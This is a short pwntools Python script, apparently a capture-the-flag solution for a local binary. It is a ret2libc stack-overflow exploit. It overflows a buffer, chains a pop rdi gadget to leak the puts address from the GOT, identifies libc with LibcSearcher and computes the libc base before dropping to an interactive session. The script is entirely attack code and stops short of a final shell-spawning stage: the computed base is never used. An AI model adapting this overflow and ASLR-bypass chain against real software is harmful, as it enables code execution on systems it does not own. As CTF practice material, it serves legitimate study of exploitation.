from pwn import *
from LibcSearcher import *

io = process("./附件")
elf = ELF("./附件")

offset = 0x10 + 0x8

ret_addr = 0x400509
pop_rdi_addr = 0x400763

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

vuln_addr = 0x004006BA

payload1 = b'A' * offset + p64(pop_rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)
io.sendline(payload1)
puts_addr = u64(io.recvuntil("\x7f")[6:].ljust(8, b"\x00"))

libc = LibcSearcher("puts", puts_addr)
base_addr = puts_addr - libc.dump('puts')

io.interactive()
